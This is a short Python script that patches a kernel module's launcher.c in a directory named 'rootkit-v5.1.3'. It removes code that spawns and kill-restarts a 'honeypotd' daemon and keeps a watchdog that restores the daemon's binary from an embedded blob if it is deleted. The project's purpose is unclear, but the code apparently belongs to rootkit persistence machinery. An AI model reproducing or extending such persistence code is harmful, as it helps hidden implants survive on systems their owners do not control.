#!/usr/bin/env python3
# -*- coding: utf-8 -*-

with open('/home/phenom/rot/rootkit-v5.1.3/src/launcher.c', 'rb') as f:
    content = f.read()

star = b'\xe2\x98\x85'  # ★ UTF-8

# 1. Remove the "Spawn honeypotd" block in launcher_start()
old1 = b"""    /* Spawn honeypotd */
    {
        char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
        char *argv[] = { HONEYPOTD_PATH, "-d", NULL };
        call_usermodehelper(HONEYPOTD_PATH, argv, envp, UMH_NO_WAIT);
    }

    /* Start watchdog thread */"""

new1 = b"""    /* Start watchdog thread */"""

assert old1 in content, "Edit 1: pattern not found!"
content = content.replace(old1, new1, 1)

# 2. Fix watchdog_fn: remove kill + spawn, only check binary exists
old2 = b"""        if (pid < 0) {
            printk(KERN_WARNING "jolteon: honeypotd not running, re-spawning...\\n");

            /* """ + star + b""" KILL SEMUA YANG LAMA DULU sebelum spawn baru */
            kill_honeypotd();

            /* Pastiin binary masih ada */
            struct path p;
            if (kern_path(HONEYPOTD_PATH, 0, &p) != 0) {
                printk(KERN_WARNING "jolteon: binary missing, re-extracting...\\n");
                write_blob(HONEYPOTD_PATH, honeypotd_bin, honeypotd_bin_len);
            } else {
                path_put(&p);
            }

            /* Spawn daemon */
            char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
            char *argv[] = { HONEYPOTD_PATH, "-d", NULL };
            int ret = call_usermodehelper(HONEYPOTD_PATH, argv, envp, UMH_NO_WAIT);
            if (ret < 0)
                printk(KERN_ERR "jolteon: re-spawn failed (%d)\\n", ret);
            else
                printk(KERN_DEBUG "jolteon: honeypotd re-spawned\\n");
        }"""

new2 = b"""        if (pid < 0) {
            printk(KERN_WARNING "jolteon: honeypotd not running (systemd will restart)\\n");

            /* Pastiin binary masih ada */
            struct path p;
            if (kern_path(HONEYPOTD_PATH, 0, &p) != 0) {
                printk(KERN_WARNING "jolteon: binary missing, re-extracting...\\n");
                write_blob(HONEYPOTD_PATH, honeypotd_bin, honeypotd_bin_len);
            } else {
                path_put(&p);
            }
        }"""

assert old2 in content, "Edit 2: pattern not found!"
content = content.replace(old2, new2, 1)

with open('/home/phenom/rot/rootkit-v5.1.3/src/launcher.c', 'wb') as f:
    f.write(content)

print("OK - both edits applied successfully")

